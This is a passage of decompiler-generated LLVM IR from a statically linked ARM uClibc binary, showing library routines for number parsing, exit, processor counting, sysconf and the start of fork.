  br label %dec_label_pc_ca50

dec_label_pc_ca4c:                                ; preds = %dec_label_pc_ca50
  %v1_ca4c = add i32 %v0_ca88, 1
  store i32 %v1_ca4c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca50

dec_label_pc_ca50:                                ; preds = %entry, %dec_label_pc_ca4c
  %v0_ca88 = phi i32 [ %v0_ca40, %entry ], [ %v1_ca4c, %dec_label_pc_ca4c ]
  %v1_ca50 = inttoptr i32 %v0_ca88 to i8*
  %v2_ca50 = load i8, i8* %v1_ca50, align 1
  %v3_ca50 = zext i8 %v2_ca50 to i32
  store i32 %v3_ca50, i32* %r1.global-to-local, align 4
  %v4_ca54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 196) to i32*), align 4
  %v2_ca58 = mul nuw nsw i32 %v3_ca50, 2
  %v2_ca5c = add i32 %v2_ca58, %v4_ca54
  %v3_ca5c = inttoptr i32 %v2_ca5c to i16*
  %v4_ca5c = load i16, i16* %v3_ca5c, align 2
  %v1_ca60 = and i16 %v4_ca5c, 32
  %v2_ca60 = icmp eq i16 %v1_ca60, 0
  br i1 %v2_ca60, label %dec_label_pc_ca68, label %dec_label_pc_ca4c

dec_label_pc_ca68:                                ; preds = %dec_label_pc_ca50
  %v7_ca68 = icmp eq i8 %v2_ca50, 43
  br i1 %v7_ca68, label %dec_label_pc_ca88, label %dec_label_pc_ca70

dec_label_pc_ca70:                                ; preds = %dec_label_pc_ca68
  %v7_ca70 = icmp eq i8 %v2_ca50, 45
  br i1 %v7_ca70, label %dec_label_pc_ca88, label %bb

bb:                                               ; preds = %dec_label_pc_ca70
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ca8c

dec_label_pc_ca88:                                ; preds = %dec_label_pc_ca68, %dec_label_pc_ca70
  %storemerge47 = phi i32 [ 1, %dec_label_pc_ca70 ], [ 0, %dec_label_pc_ca68 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_ca88 = add i32 %v0_ca88, 1
  store i32 %v1_ca88, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca8c

dec_label_pc_ca8c:                                ; preds = %bb, %dec_label_pc_ca88
  %v0_caac = phi i32 [ %v0_ca88, %bb ], [ %v1_ca88, %dec_label_pc_ca88 ]
  %v1_ca8c = and i32 %v0_ca3c, -17
  %v3_ca8c = icmp eq i32 %v1_ca8c, 0
  br i1 %v3_ca8c, label %dec_label_pc_ca98, label %bb60

bb60:                                             ; preds = %dec_label_pc_ca8c
  br label %bb64

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca8c
  %v1_ca98 = inttoptr i32 %v0_caac to i8*
  %v2_ca98 = load i8, i8* %v1_ca98, align 1
  %v7_ca9c = icmp eq i8 %v2_ca98, 48
  %v1_caa0 = add i32 %v0_ca3c, 10
  store i32 %v1_caa0, i32* %r5.global-to-local, align 4
  br i1 %v7_ca9c, label %dec_label_pc_caac, label %bb61

bb61:                                             ; preds = %dec_label_pc_ca98
  br label %.thread8

dec_label_pc_caac:                                ; preds = %dec_label_pc_ca98
  %v1_caac = add i32 %v0_caac, 1
  %v2_caac = inttoptr i32 %v1_caac to i8*
  %v3_caac = load i8, i8* %v2_caac, align 1
  %v4_caac = zext i8 %v3_caac to i32
  store i32 %v1_caac, i32* %r4.global-to-local, align 4
  %v1_cab0 = or i32 %v4_caac, 32
  %v7_cab4 = icmp eq i32 %v1_cab0, 120
  %v1_cab8 = add i32 %v0_ca3c, 8
  store i32 %v1_cab8, i32* %r5.global-to-local, align 4
  br i1 %v7_cab4, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_caac
  %v3_cac4 = mul i32 %v1_cab8, 2
  store i32 %v3_cac4, i32* %r5.global-to-local, align 4
  %v2_cac8 = add i32 %v0_caac, 2
  store i32 %v2_cac8, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_caac, %bb61, %bb62
  %v1_cb9c30 = phi i32 [ %v0_ca40, %bb61 ], [ %v1_caac, %bb62 ], [ %v1_caac, %dec_label_pc_caac ]
  %v0_cb1821 = phi i32 [ %v0_caac, %bb61 ], [ %v2_cac8, %bb62 ], [ %v1_caac, %dec_label_pc_caac ]
  %v0_cacc = phi i32 [ %v1_caa0, %bb61 ], [ %v3_cac4, %bb62 ], [ %v1_cab8, %dec_label_pc_caac ]
  %v5_cad0 = icmp slt i32 %v0_cacc, 16
  br i1 %v5_cad0, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_cb9c29 = phi i32 [ %v0_ca40, %bb60 ], [ %v1_cb9c30, %.thread8 ], [ %v1_cb9c30, %bb63 ]
  %v0_cb1820 = phi i32 [ %v0_caac, %bb60 ], [ %v0_cb1821, %.thread8 ], [ %v0_cb1821, %bb63 ]
  %v0_caf8 = phi i32 [ %v0_ca3c, %bb60 ], [ %v0_cacc, %.thread8 ], [ 16, %bb63 ]
  %v1_cad4 = add i32 %v0_caf8, -2
  %tmp = icmp ugt i32 %v1_cad4, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_cae4

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_cb98

dec_label_pc_cae4:                                ; preds = %bb64
  %v2_caec = udiv i32 -1, %v0_caf8
  %v3_caec = urem i32 -1, %v0_caf8
  store i32 %v0_caf8, i32* %r1.global-to-local, align 4
  %v1_cafc = urem i32 %v3_caec, 256
  store i32 %v1_cafc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_caec, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_cb18

dec_label_pc_cb14:                                ; preds = %bb71, %dec_label_pc_cb74
  %v0_cb14 = phi i32 [ %v1_cb5444, %bb71 ], [ %v0_cb14.pre, %dec_label_pc_cb74 ]
  br label %dec_label_pc_cb18

dec_label_pc_cb18:                                ; preds = %dec_label_pc_cae4, %dec_label_pc_cb14
  %v1_cb9c27 = phi i32 [ %v1_cb9c29, %dec_label_pc_cae4 ], [ %v0_cb14, %dec_label_pc_cb14 ]
  %v0_cb54 = phi i32 [ %v0_cb1820, %dec_label_pc_cae4 ], [ %v0_cb14, %dec_label_pc_cb14 ]
  %v1_cb18 = inttoptr i32 %v0_cb54 to i8*
  %v2_cb18 = load i8, i8* %v1_cb18, align 1
  %v3_cb18 = zext i8 %v2_cb18 to i32
  %v1_cb1c = add nsw i32 %v3_cb18, -48
  %v1_cb20 = urem i32 %v1_cb1c, 256
  store i32 %v1_cb20, i32* %r1.global-to-local, align 4
  %v1_cb28 = or i32 %v3_cb18, 32
  %tmp79 = icmp ult i32 %v1_cb20, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_cb30

dec_label_pc_cb30:                                ; preds = %dec_label_pc_cb18
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_cb28, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_cb30
  %v1_cb34 = add nsw i32 %v1_cb28, -87
  %v5_cb3c = urem i32 %v1_cb34, 256
  store i32 %v5_cb3c, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_cb18, %dec_label_pc_cb30, %bb65
  %v3_cb6c = phi i32 [ %v1_cb20, %dec_label_pc_cb18 ], [ 40, %dec_label_pc_cb30 ], [ %v5_cb3c, %bb65 ]
  %v1_cb40 = load i32, i32* %r5.global-to-local, align 4
  %v6_cb44 = icmp slt i32 %v3_cb6c, %v1_cb40
  br i1 %v6_cb44, label %dec_label_pc_cb48, label %dec_label_pc_cb98.loopexit

dec_label_pc_cb48:                                ; preds = %bb66
  %v0_cb48 = load i32, i32* %ip.global-to-local, align 4
  %v1_cb48 = load i32, i32* %r8.global-to-local, align 4
  %v9_cb48 = icmp eq i32 %v0_cb48, %v1_cb48
  br i1 %v9_cb48, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_cb48
  %v1_cb5440 = add i32 %v0_cb54, 1
  store i32 %v1_cb5440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb5c

bb67:                                             ; preds = %dec_label_pc_cb48
  %v3_cb48 = icmp ult i32 %v0_cb48, %v1_cb48
  %v1_cb54 = add i32 %v0_cb54, 1
  store i32 %v1_cb54, i32* %r4.global-to-local, align 4
  br i1 %v3_cb48, label %dec_label_pc_cb5c, label %dec_label_pc_cb74

dec_label_pc_cb5c:                                ; preds = %bb67, %.thread39
  %v1_cb5444 = phi i32 [ %v1_cb5440, %.thread39 ], [ %v1_cb54, %bb67 ]
  %v4_cb642443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_cb5c = load i32, i32* %sl.global-to-local, align 4
  %v3_cb5c = icmp uge i32 %v3_cb6c, %v1_cb5c
  %v9_cb5c = icmp eq i32 %v3_cb6c, %v1_cb5c
  %v2_cb60 = xor i1 %v3_cb5c, true
  %v3_cb60 = or i1 %v9_cb5c, %v2_cb60
  br i1 %v3_cb60, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_cb5c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_cb5c, %bb68
  %v4_cb64 = phi i32 [ %v4_cb642443, %dec_label_pc_cb5c ], [ 0, %bb68 ]
  %v2_cb64 = xor i1 %v9_cb5c, true
  %v3_cb64 = and i1 %v3_cb5c, %v2_cb64
  br i1 %v3_cb64, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_cb64 = urem i32 %v4_cb64, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_cb68 = phi i32 [ %v5_cb64, %bb70 ], [ %v4_cb64, %bb69 ]
  %v2_cb68 = icmp eq i32 %v0_cb68, 0
  br i1 %v2_cb68, label %bb71, label %dec_label_pc_cb74

bb71:                                             ; preds = %thread-pre-split
  %v4_cb6c = mul i32 %v0_cb48, %v1_cb40
  %v5_cb6c = add i32 %v4_cb6c, %v3_cb6c
  store i32 %v5_cb6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_cb14

dec_label_pc_cb74:                                ; preds = %bb67, %thread-pre-split
  %v0_cb7c = call i32 @__aeabi_read_tp()
  %v0_cb80 = load i32, i32* %r7.global-to-local, align 4
  %v2_cb80 = and i32 %v0_ca44, %v0_cb80
  store i32 %v2_cb80, i32* %r7.global-to-local, align 4
  %v0_cb84 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_cb84, i32* %ip.global-to-local, align 4
  %v3_cb88 = load i16, i16* @global_var_222f0.75, align 2
  %v4_cb88 = sext i16 %v3_cb88 to i32
  %v3_cb90 = add i32 %v4_cb88, %v0_cb7c
  %v4_cb90 = inttoptr i32 %v3_cb90 to i32*
  store i32 34, i32* %v4_cb90, align 4
  %v0_cb14.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb14

dec_label_pc_cb98.loopexit:                       ; preds = %bb66
  %v0_cb98.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %.thread, %dec_label_pc_cb98.loopexit
  %v1_cb9c = phi i32 [ %v1_cb9c27, %dec_label_pc_cb98.loopexit ], [ %v1_cb9c29, %.thread ]
  %v2_cb9c = phi i32 [ %v0_cb98.pre, %dec_label_pc_cb98.loopexit ], [ %v0_ca38, %.thread ]
  %v2_cb98 = icmp eq i32 %v2_cb9c, 0
  br i1 %v2_cb98, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_cb98
  %v3_cb9c = inttoptr i32 %v2_cb9c to i32*
  store i32 %v1_cb9c, i32* %v3_cb9c, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_cb98, %bb72
  %v0_cba4 = load i32, i32* %r7.global-to-local, align 4
  %v2_cba4 = icmp eq i32 %v0_cba4, 0
  %. = select i1 %v2_cba4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_cbb0 = icmp eq i32 %v0_ca44, 0
  %v0_cbdc.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_cbb0, label %dec_label_pc_cbd4, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_cbdc.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_cbbc, label %dec_label_pc_cbd4

dec_label_pc_cbbc:                                ; preds = %bb76
  %v0_cbc0 = call i32 @__aeabi_read_tp()
  %v3_cbc4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_cbc4 = sext i16 %v3_cbc4 to i32
  %v3_cbcc = add i32 %v4_cbc4, %v0_cbc0
  %v4_cbcc = inttoptr i32 %v3_cbcc to i32*
  store i32 34, i32* %v4_cbcc, align 4
  %v0_cbd0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_cbd0, i32* %ip.global-to-local, align 4
  %v0_cbd4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cbd4

dec_label_pc_cbd4:                                ; preds = %bb76, %bb73, %dec_label_pc_cbbc
  %v0_cbdc.pre = phi i32 [ %v0_cbdc.pre.pre, %bb76 ], [ %v0_cbd0, %dec_label_pc_cbbc ], [ %v0_cbdc.pre.pre, %bb73 ]
  %v0_cbd4 = phi i32 [ %v0_cba4, %bb76 ], [ %v0_cbd4.pre, %dec_label_pc_cbbc ], [ %v0_cba4, %bb73 ]
  %v2_cbd4 = icmp eq i32 %v0_cbd4, 0
  br i1 %v2_cbd4, label %dec_label_pc_cbd4._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_cbd4
  %v2_cbd8 = sub i32 0, %v0_cbdc.pre
  store i32 %v2_cbd8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_cbd4._crit_edge

dec_label_pc_cbd4._crit_edge:                     ; preds = %dec_label_pc_cbd4, %bb77
  %v0_cbdc = phi i32 [ %v2_cbd8, %bb77 ], [ %v0_cbdc.pre, %dec_label_pc_cbd4 ]
  ret i32 %v0_cbdc

; uselistorder directives
  uselistorder i32 %v0_cbdc.pre, { 1, 0 }
  uselistorder i32 %v0_cbdc.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_cb64, { 1, 0 }
  uselistorder i1 %v3_cb5c, { 1, 0 }
  uselistorder i32 %v1_cb5c, { 1, 0 }
  uselistorder i32 %v5_cb3c, { 1, 0 }
  uselistorder i32 %v1_cb28, { 1, 0 }
  uselistorder i32 %v1_cb20, { 2, 0, 1 }
  uselistorder i32 %v0_cb54, { 1, 0, 2 }
  uselistorder i32 %v0_cb14, { 1, 0 }
  uselistorder i32 %v3_cac4, { 1, 0 }
  uselistorder i32 %v1_cab8, { 1, 0, 2 }
  uselistorder i32 %v0_caac, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_ca88, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ca44, { 1, 0 }
  uselistorder i32 %v0_ca40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ca3c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder label %dec_label_pc_cbd4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_cbd4, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_cb98, { 1, 0 }
  uselistorder label %dec_label_pc_cb74, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb18, { 1, 0 }
  uselistorder label %dec_label_pc_cb14, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca8c, { 1, 0 }
  uselistorder label %dec_label_pc_ca88, { 1, 0 }
  uselistorder label %dec_label_pc_ca50, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r5, align 4
  %v4_cc08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 148) to i32*), align 4
  store i32 %v4_cc08, i32* @r4, align 4
  %v2_cc10 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_cc28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_cc28)
  %v0_cc3c = load i32, i32* @r5, align 4
  %v2_cc3c = add i32 %v0_cc3c, 16
  %v3_cc3c = inttoptr i32 %v2_cc3c to i32*
  %v4_cc3c = load i32, i32* %v3_cc3c, align 4
  call void @__pseudo_branch(i32 %v4_cc3c)
  %v0_cc4c = load i32, i32* @r5, align 4
  %v2_cc4c = add i32 %v0_cc4c, 1252
  %v3_cc4c = inttoptr i32 %v2_cc4c to i32*
  %v4_cc4c = load i32, i32* %v3_cc4c, align 4
  %v2_cc54 = icmp eq i32 %v4_cc4c, 0
  br i1 %v2_cc54, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_cc60 = xor i1 %v2_cc54, true
  call void @__pseudo_cond_branch(i1 %v2_cc60, i32 %v4_cc4c)
  store i32 %v2_cc10, i32* @r0, align 4
  %v0_cc70 = load i32, i32* @r5, align 4
  %v2_cc70 = add i32 %v0_cc70, 48
  %v3_cc70 = inttoptr i32 %v2_cc70 to i32*
  %v4_cc70 = load i32, i32* %v3_cc70, align 4
  call void @__pseudo_branch(i32 %v4_cc70)
  %v0_cc7c = call i32 @__GI___uClibc_fini()
  %v0_cc84 = load i32, i32* @r5, align 4
  %v2_cc84 = add i32 %v0_cc84, -76444
  %v2_cc8c = icmp eq i32 %v2_cc84, 0
  br i1 %v2_cc8c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_cc94 = xor i1 %v2_cc8c, true
  call void @__pseudo_cond_branch(i1 %v2_cc94, i32 %v2_cc84)
  %v0_cc98 = load i32, i32* @r6, align 4
  %v1_cc9c = call i32 @__GI__exit(i32 %v0_cc98)
  %v0_cca0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_cca0, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_cca0 = load i32, i32* @r1, align 4
  %v2_cca0 = load i32, i32* @r4, align 4
  %v5_cca0 = mul i32 %v2_cca0, 8192
  %v6_cca0 = and i32 %v5_cca0, %v1_cca0
  store i32 %v6_cca0, i32* @r5, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_ccb8 = phi i32 [ %v1_cc9c, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_ccb8

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 3, 2, 1 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37396), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_cce0 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37396))
  store i32 %v1_cce0, i32* @r6, align 4
  %v2_cce4 = icmp eq i32 %v1_cce0, 0
  br i1 %v2_cce4, label %dec_label_pc_cd64, label %dec_label_pc_ccec

dec_label_pc_ccec:                                ; preds = %entry
  store i32 196, i32* @sl, align 4
  %v0_ccf4 = load i32, i32* @r4, align 4
  %v2_ccf4 = add i32 %v0_ccf4, -37384
  store i32 %v2_ccf4, i32* @r8, align 4
  %v2_ccf8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_ccf8, i32* @r7, align 4
  br label %bb18

dec_label_pc_cd00:                                ; preds = %bb18
  %v3_cd00 = load i32, i32* %stack_var_-36, align 4
  %v1_cd04 = inttoptr i32 %v3_cd00 to i32*
  %v2_cd04 = load i32, i32* %v1_cd04, align 4
  %v1_cd08 = inttoptr i32 %v2_cd04 to i8*
  %v2_cd08 = load i8, i8* %v1_cd08, align 1
  %v7_cd0c = icmp eq i8 %v2_cd08, 99
  br i1 %v7_cd0c, label %dec_label_pc_cd14, label %.backedge3

dec_label_pc_cd14:                                ; preds = %dec_label_pc_cd00
  %v1_cd14 = add i32 %v2_cd04, 1
  %v2_cd14 = inttoptr i32 %v1_cd14 to i8*
  %v3_cd14 = load i8, i8* %v2_cd14, align 1
  %v7_cd18 = icmp eq i8 %v3_cd14, 112
  br i1 %v7_cd18, label %dec_label_pc_cd20, label %.backedge3

dec_label_pc_cd20:                                ; preds = %dec_label_pc_cd14
  %v1_cd20 = add i32 %v2_cd04, 2
  %v2_cd20 = inttoptr i32 %v1_cd20 to i8*
  %v3_cd20 = load i8, i8* %v2_cd20, align 1
  %v7_cd24 = icmp eq i8 %v3_cd20, 117
  br i1 %v7_cd24, label %dec_label_pc_cd2c, label %.backedge3

dec_label_pc_cd2c:                                ; preds = %dec_label_pc_cd20
  %v1_cd2c = add i32 %v2_cd04, 3
  %v2_cd2c = inttoptr i32 %v1_cd2c to i8*
  %v3_cd2c = load i8, i8* %v2_cd2c, align 1
  %v4_cd2c = zext i8 %v3_cd2c to i32
  %v0_cd30 = load i32, i32* @r4, align 4
  %v1_cd30 = load i32, i32* @sl, align 4
  %v2_cd30 = add i32 %v1_cd30, %v0_cd30
  %v3_cd30 = inttoptr i32 %v2_cd30 to i32*
  %v4_cd30 = load i32, i32* %v3_cd30, align 4
  %v2_cd34 = mul nuw nsw i32 %v4_cd2c, 2
  %v2_cd38 = add i32 %v4_cd30, %v2_cd34
  %v3_cd38 = inttoptr i32 %v2_cd38 to i16*
  %v4_cd38 = load i16, i16* %v3_cd38, align 2
  %v1_cd3c = and i16 %v4_cd38, 8
  %v2_cd3c = icmp eq i16 %v1_cd3c, 0
  br i1 %v2_cd3c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_cd2c
  %v1_cd40 = load i32, i32* @r5, align 4
  %v2_cd40 = add i32 %v1_cd40, 1
  store i32 %v2_cd40, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_cd2c, %dec_label_pc_cd00, %dec_label_pc_cd14, %dec_label_pc_cd20
  %v0_cd44.pre = load i32, i32* @r6, align 4
  %v0_cd50.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_ccec
  %v0_cd50 = phi i32 [ %v0_cd50.pre, %.backedge3 ], [ %v2_ccf4, %dec_label_pc_ccec ]
  %v0_cd44 = phi i32 [ %v0_cd44.pre, %.backedge3 ], [ %v1_cce0, %dec_label_pc_ccec ]
  %v4_cd54 = inttoptr i32 %v0_cd44 to i32*
  %v5_cd54 = call i32 @__GI_config_read(i32* %v4_cd54, i32 %v2_ccf8, i32 258, i32 %v0_cd50)
  %v2_cd58 = icmp eq i32 %v5_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cdc8, label %dec_label_pc_cd00

dec_label_pc_cd64:                                ; preds = %entry
  %v0_cd68 = load i32, i32* @r4, align 4
  %v2_cd68 = add i32 %v0_cd68, -37380
  store i32 %v2_cd68, i32* @r0, align 4
  %v1_cd6c = call i32 @__GI_config_open(i32 %v2_cd68)
  store i32 %v1_cd6c, i32* @r6, align 4
  %v2_cd70 = icmp eq i32 %v1_cd6c, 0
  br i1 %v2_cd70, label %bb19, label %dec_label_pc_cd7c

bb19:                                             ; preds = %dec_label_pc_cd64
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_cdc8

dec_label_pc_cd7c:                                ; preds = %dec_label_pc_cd64
  %v0_cd80 = load i32, i32* @r4, align 4
  %v2_cd80 = add i32 %v0_cd80, -37364
  store i32 %v2_cd80, i32* @r8, align 4
  %v2_cd88 = add i32 %v0_cd80, -37328
  store i32 %v2_cd88, i32* @r7, align 4
  %v2_cd8c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_cd8c, i32* @r4, align 4
  br label %bb21

dec_label_pc_cd94:                                ; preds = %bb21
  %v0_cdc0 = load i32, i32* @r8, align 4
  %v3_cd94 = load i32, i32* %stack_var_-36, align 4
  %v1_cd98 = inttoptr i32 %v3_cd94 to i32*
  %v2_cd98 = load i32, i32* %v1_cd98, align 4
  store i32 %v2_cd98, i32* @r1, align 4
  %v2_cd9c = inttoptr i32 %v0_cdc0 to i8*
  %v3_cd9c = call i32 @__GI_strcoll(i8* %v2_cd9c, i32 %v2_cd98)
  %v2_cda0 = icmp eq i32 %v3_cd9c, 0
  br i1 %v2_cda0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_cd94
  %v1_cda4 = load i32, i32* @r5, align 4
  %v2_cda4 = add i32 %v1_cda4, 1
  store i32 %v2_cda4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_cd94
  %v0_cdb0.pre = load i32, i32* @r7, align 4
  %v0_cdb4.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_cd7c
  %v0_cdb4 = phi i32 [ %v0_cdb4.pre, %.backedge ], [ %v1_cd6c, %dec_label_pc_cd7c ]
  %v0_cdb0 = phi i32 [ %v0_cdb0.pre, %.backedge ], [ %v2_cd88, %dec_label_pc_cd7c ]
  %v4_cdb8 = inttoptr i32 %v0_cdb4 to i32*
  %v5_cdb8 = call i32 @__GI_config_read(i32* %v4_cdb8, i32 %v2_cd8c, i32 459266, i32 %v0_cdb0)
  %v2_cdbc = icmp eq i32 %v5_cdb8, 0
  br i1 %v2_cdbc, label %dec_label_pc_cdc8, label %dec_label_pc_cd94

dec_label_pc_cdc8:                                ; preds = %bb18, %bb21, %bb19
  %v0_cdc8 = load i32, i32* @r6, align 4
  %v1_cdcc = inttoptr i32 %v0_cdc8 to i32*
  %v2_cdcc = call i32 @__GI_config_close(i32* %v1_cdcc)
  %v0_cdd0 = load i32, i32* @r5, align 4
  %v2_cdd0 = icmp eq i32 %v0_cdd0, 0
  %.v0_cdd0 = select i1 %v2_cdd0, i32 1, i32 %v0_cdd0
  ret i32 %.v0_cdd0

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_cdc8, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_d1fc

bb:                                               ; preds = %entry
  %v7_ce20 = mul i32 %arg1, 4
  %v8_ce20 = add i32 %v7_ce20, ptrtoint (i32* @global_var_ce28.221 to i32)
  call void @__pseudo_branch(i32 %v8_ce20)
  br label %dec_label_pc_d1fc

dec_label_pc_d1fc:                                ; preds = %bb, %entry
  %v0_d200 = call i32 @__aeabi_read_tp()
  %v3_d204 = load i16, i16* @global_var_222f0.75, align 2
  %v4_d204 = sext i16 %v3_d204 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_d210 = add i32 %v4_d204, %v0_d200
  %v4_d210 = inttoptr i32 %v3_d210 to i32*
  store i32 22, i32* %v4_d210, align 4
  %v0_d3f4 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_d3f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 13148, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r8.global-to-local, align 4
  %v4_d52016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13148) to i32*), align 4
  store i32 %v4_d52016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d52418 = icmp eq i32 %v4_d52016, 0
  br i1 %v2_d52418, label %dec_label_pc_d52c, label %dec_label_pc_d450

dec_label_pc_d450:                                ; preds = %entry, %dec_label_pc_d520.backedge
